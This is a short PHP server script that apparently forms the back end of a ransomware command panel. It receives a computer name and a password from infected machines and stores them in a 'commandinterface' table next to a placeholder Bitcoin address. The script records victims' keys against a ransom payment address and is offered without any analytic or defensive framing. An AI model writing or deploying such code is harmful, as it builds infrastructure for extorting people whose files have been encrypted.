<?php

if(!isset($_POST) || empty($_POST['pcname'])) {
	exit;
}

$pcname = $_POST['pcname']; 
$password = $_POST['password']; 
$bitcoinaddr = "SampleBitcoinAddressHere";

include 'db.php';
$stmt = $connection->prepare('INSERT INTO commandinterface (pcname, bitcoinaddr, password) VALUES (?, ?, ?)');

$stmt->execute([
	$pcname,
	$bitcoinaddr,
	$password
]);


echo "Successful!";
